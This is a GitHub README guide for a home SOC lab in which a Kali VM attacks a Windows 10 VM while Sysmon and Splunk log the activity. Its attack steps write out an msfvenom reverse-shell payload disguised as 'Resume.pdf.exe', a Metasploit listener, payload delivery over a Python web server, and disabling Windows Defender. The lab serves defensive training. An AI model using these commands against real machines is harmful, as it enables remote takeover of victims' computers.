# SOC-Home-Lab

## Introduction
This document provides a guide for setting up a Security Operations Center (SOC) home lab. The lab consists of two virtual machines (VMs): an attacker machine running Kali Linux and a victim machine running Windows 10. The primary objective of this lab is to simulate real-world security scenarios, analyze attacks, and enhance practical cybersecurity skills.

## Objective
The objective of this lab is to:  
- Simulate cyber attacks in a controlled environment.  
- Monitor and analyze system and network logs using SIEM tools.  
- Gain hands-on experience with Sysmon, Splunk, and Windows Event Logs.  
- Understand attack techniques and learn defensive strategies.  
- Develop practical cybersecurity skills applicable to a SOC analyst role.

## Prerequisites
| Category                    | Requirements                                                                 |
|-----------------------------|-----------------------------------------------------------------------------|
| **Operating Systems**        | Windows 10 ISO, Kali Linux Pre-built VM                                      |
| **System Requirements**      | RAM: 8GB or Higher, Internet Connectivity for downloads/updates |
| **Logging & Monitoring Tools** | Splunk (SIEM & security analytics), Sysmon (System monitoring & event logging) |
| **Virtualization Software**   | VirtualBox                                                                  |

## Network Topology
Below is a simple diagram that illustrates the network topology for this lab setup:\
[Kali Linux (Attacker)] ---> [Windows 10 VM (Target)] ---> [Splunk (Log Monitoring)]\
The Kali Linux machine attacks the Windows VM, and logs are collected by Splunk for analysis.

## Step 1: Setting Up Virtual Machines

### 1.1 Install Kali Linux (Attacker Machine)
1. Download Kali Linux ISO from the [Kali Official Website](https://www.kali.org/).  
2. In VirtualBox, create a new virtual machine by clicking **Tools → Add**, and follow the prompts to install Kali Linux.

### 1.2 Install Windows 10 (Target Machine)
1. Download Windows 10 installation media from [Microsoft's website](https://www.microsoft.com/en-us/software-download/windows10).  
2. Create ISO file from the installation media.  
3. Create a new virtual machine in VirtualBox and install Windows 10 using the ISO file.

## Step 2: Install Sysmon on Windows 10
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).  
2. Download a pre-configured `sysmonconfig.xml` from [Sysmon Modular](https://github.com/SwiftOnSecurity/sysmon-config).  
3. Extract the Sysmon files and place the `sysmonconfig.xml` file into the extracted directory.  
4. Open PowerShell as an administrator and navigate to the Sysmon directory:
  ```powershell
cd C:\Users\Downloads\sysmon
```
5. Verify Sysmon is running:
```powershell
Get-Process sysmon64
```
6. Install Sysmon with the configuration:
```powershell
.\sysmon64.exe -i sysmonconfig.xml
```

## Step 3: Install Splunk on Windows 10
1. **Download Splunk Free** from the Splunk website.  
2. **Install Splunk** on your Windows 10 VM.  
3. Go to the folder where Splunk is installed:  
   `splunk → system → local`  
   and create a file named **inputs.conf** with the following content:
  ```ini
  [WinEventLog://Microsoft-Windows-Sysmon/Operational]
  index = endpoint
  disabled = false
  renderXml = true
  source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
  
  [WinEventLog://Microsoft-Windows-Windows Defender/Operational]
  index = endpoint
  disabled = false
  source = Microsoft-Windows-Windows Defender/Operational
  blacklist = 1151,1150,2000,1002,1001,1000
  
  [WinEventLog://Microsoft-Windows-PowerShell/Operational]
  index = endpoint
  disabled = false
  source = Microsoft-Windows-PowerShell/Operational
  blacklist = 4100,4105,4106,40961,40962,53504
  
  [WinEventLog://Application]
  index = endpoint
  disabled = false
  
  [WinEventLog://Security]
  index = endpoint
  disabled = false
  
  [WinEventLog://System]
  index = endpoint
  disabled = false
  ```
4. **Launch Splunk** and log in with administrative credentials.
5. **Enable data collection** in Splunk.  
3. To parse Sysmon data, go to **Apps → Find More Apps** and install the **Splunk Add-on for Sysmon**.  
4. **Create a new index** named `endpoint` for Sysmon logs:  
   - Navigate to **Settings → Indexes**  
   - Click **New Index**  
   - Enter the name `endpoint`  
   - Save the configuration  

## Step 4: Setting Up a Separate Network  
 Configure both VMs (Windows 10 and Kali Linux) to use the **same Internal Network** in VirtualBox settings. Assign **static IP addresses** to the respective network adapters on each VM, ensuring they are on the **same subnet**.
1. To enable interaction between the Windows 10 and Kali Linux VMs, create a **private network**:  
   - Open **VirtualBox → Settings** for each VM  
   - Click on **Network**  
   - Change **Adapter 1**'s attachment type to **Internal Network**  
   - Give the internal network a name and click **OK**
   - This setup allows the VMs to communicate with each other on an isolated network.  
      <img width="512" height="315" alt="1_network_1" src="https://github.com/user-attachments/assets/373dfc0d-44a2-424c-84e5-ff126e1531dd" />
        <img width="512" height="315" alt="1_network_2" src="https://github.com/user-attachments/assets/cc8f4785-2508-483e-884b-16b8213752fb" />
2. Configuring Static IP on Windows 10  
  - Right-click the **network icon** in the taskbar and select **Network & Internet settings**.
  - Click **Change adapter options**, right-click on **Ethernet** and select **Properties**.
  - Double-click **Internet Protocol Version 4 (TCP/IPv4)**, select **Use the following IP address** and enter the desired IP address and subnet mask.

    <img width="512" height="392" alt="win_net_1" src="https://github.com/user-attachments/assets/eb908b0c-0c27-4c95-9ef9-95759bbbe4fe" />
    <img width="512" height="389" alt="win_net_2" src="https://github.com/user-attachments/assets/65cd2891-1a65-41ee-aa1a-6721c1e4a3c8" />
    <img width="352" height="458" alt="win_net_3" src="https://github.com/user-attachments/assets/8ead9ca4-961b-4dfc-960b-9076e54a71f0" />
    \
    <img width="391" height="444" alt="win_net_4" src="https://github.com/user-attachments/assets/ef5c9a76-d1bc-4383-bd91-2e5e01353d12" />
3.Configuring Static IP on Kali Linux
  - Click the network icon in the top-right corner and select "Edit Connections."
  - Choose "Wired connection 1," go to the "IPv4 Settings" tab, change the method to Manual, and add the desired IP address and netmask.
  - Click Save.

    <img width="512" height="162" alt="kali_net1" src="https://github.com/user-attachments/assets/f314c202-3c7d-41bc-af4a-0decacb3ac8e" />
    <img width="512" height="324" alt="kali_net2" src="https://github.com/user-attachments/assets/40fe3248-3b42-464d-8411-6b6ba41c7032" />
    <img width="512" height="406" alt="kali_net3" src="https://github.com/user-attachments/assets/57de4c9a-774b-4a0f-9ee4-041ddb26458e" />

## Step 5: Scanning for open port
1. Open a terminal on the Kali Linux machine.  
2. Scan port using nmap.
  - The following command will show nmap available options:
       ```bash
       nmap -h
       ```
  - Then type the following command:
      ```bash
       nmap -A 192.168.20.10 -Pn
      ```
  - This command will perform an aggressive scan (-A) and skip host discovery (-Pn).
  - If Remote Desktop Protocol is enabled on the Windows machine, port 3389 will be listed as open.

## Step 6: Creating malware using msfvenom
**Generate Malware:** In a Kali terminal, execute the following command to create a reverse shell payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=<Attacker_IP> Lport=4444 -f exe -o Resume.pdf.exe
```
  <img width="512" height="142" alt="malware" src="https://github.com/user-attachments/assets/1152858e-6c57-4f5e-a80e-1273af4bfe18" />

## Step 7: Setting Up a Metasploit Listener
1. Open the Metasploit console by typing:
  ```bash
  msfconsole
  ```
  <img width="457" height="512" alt="metasploit" src="https://github.com/user-attachments/assets/45a98296-978b-41c8-8861-45285c9ee34b" />

2. Execute the following commands to configure the listener:
    ```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST <Attacker_IP>
    set LPORT 4444
    exploit
    ```
  <img width="434" height="512" alt="sploit_config" src="https://github.com/user-attachments/assets/4e19f4b1-2d5a-4c26-a6ab-cb732c6d857f" />

3. To deploy Malware in a separate terminal, set up a Python web server in the directory where the malware was saved. It will allow the Windows machine to download it:
  ```bash
  python3 -m http.server 9999
  ```
  <img width="512" height="174" alt="python_Server" src="https://github.com/user-attachments/assets/88fe80fd-a0f7-465d-9e4a-bb731688d9b0" />

## Step 8: Executing Malware on the Windows Machine
1. **Disable Windows Defender:** Before execution, disable Windows Defender's real-time protection on the Windows machine, as this common malware is easily detected.
2. **Execute Malware:**
   - On the Windows machine, open a browser and navigate to the IP address of the Python web server (e.g., `http://<Attacker_IP>:9999`) to download the malware.
   - Locate and execute the downloaded `Resume.pdf.exe` file.
3. **Verify Connection:** To confirm the reverse shell, open Command Prompt as an administrator on the Windows machine and run: 
  ```cmd
  netstat -anob
  ```
<img width="386" height="101" alt="win_cmd1" src="https://github.com/user-attachments/assets/ae732bcd-627d-4160-bd16-1a2c0f8d47b9" />
<img width="512" height="42" alt="win_cmd2" src="https://github.com/user-attachments/assets/08f56326-3857-48ae-bfee-8633d051f45a" />

## Step 9: Run Commands in Linux to Establish a Shell
1. Once the connection is established, you can interact with the compromised system from the Metasploit listener. The following commands can be used to gather system information:
  ```bash
  shell
  net user
  net localgroup
  ipconfig
  ```
2. Examine the logs to identify the commands that were executed, the processes that were spawned, and the overall log data generated by the attack simulation.
<img width="512" height="339" alt="exploit1" src="https://github.com/user-attachments/assets/1cb6ca37-a5d8-4004-89e2-897c65fe3e32" />
\
<img width="325" height="406" alt="exploit2" src="https://github.com/user-attachments/assets/5cd6b544-45d1-442a-9515-24627d52f206" />
\
<img width="512" height="208" alt="exploit3" src="https://github.com/user-attachments/assets/89c0d8ce-d799-4dbf-a0ea-59eebd2a433d" />

## Step 10: Monitoring Logs in Splunk
In the Splunk search bar, use the following search queries to investigate the attack:
  ```splunk
  index=endpoint sourcetype=WinEventLog:Security
  index=endpoint "attacker IP"
  index=endpoint "malware file name"
  ```
  <img width="1002" height="618" alt="splunk1" src="https://github.com/user-attachments/assets/0a1aa502-0b1f-45fe-8bc8-0ff9b497283d" />
  <img width="1007" height="592" alt="splunk2" src="https://github.com/user-attachments/assets/dc680421-da62-4b55-b670-632093902e7a" />
  <img width="990" height="566" alt="splunk3" src="https://github.com/user-attachments/assets/c5e4a3ac-553c-4bc9-9c26-c46877226beb" />
  <img width="1011" height="611" alt="splunk4" src="https://github.com/user-attachments/assets/ee170d74-b412-439f-a10f-5d33f53828e9" />

## Troubleshooting
- **Metasploit:** If the listener fails, verify that the **LHOST** (Kali IP) and **LPORT** are correctly configured in both the malware and the Metasploit handler. Ensure Windows Defender is disabled.
- **Splunk:** If no logs appear, confirm that your search query uses the correct index (`index=endpoint`) and that logs are being forwarded from the Windows machine.

## Key Lab Learnings
- **Attacker Skills:** Learn to use tools like Metasploit and Python to create and deploy malware.
- **Defender Skills:** Practice configuring Sysmon and Splunk to detect and analyze threats.
- **Forensic Analysis:** Learn to analyze network connections and logs to identify an attack.

## References

1. [SOC Lab Setup and Sysmon Installation – MyDFIR](https://www.youtube.com/watch?v=kku0fVfksrk&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=2&ab_channel=MyDFIR)

2. [Using Metasploit and Creating Malware – MyDFIR](https://www.youtube.com/watch?v=5iafC6vj7kM&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=3&ab_channel=MyDFIR)

3. [Monitoring Logs with Splunk – MyDFIR](https://www.youtube.com/watch?v=-8X7Ay4YCoA&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=4&ab_channel=MyDFIR)
